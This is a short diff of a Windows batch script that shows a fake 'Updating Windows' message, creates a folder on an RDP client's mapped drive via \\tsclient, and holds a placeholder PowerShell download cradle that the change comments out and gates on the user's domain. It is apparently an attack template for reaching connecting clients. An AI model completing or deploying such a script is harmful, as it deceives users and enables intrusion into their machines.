@@ -1,5 +1,8 @@
 @echo off
 
+echo Updating Windows ...
+
+@echo off
 timeout 1 >nul 2>&1
 
 mkdir \\tsclient\c\temp >nul 2>&1
@@ -24,4 +27,5 @@ for /F "tokens=*" %%a in (%TEMP%\temp_00.txt) DO (
 
 del /q %TEMP%\temp_00.txt >nul 2>&1
 
-powershell.exe <cradle here>
+
+REM if "WINDOMAIN"="%USERDOMAIN%"( powershell.exe <cradle here> )
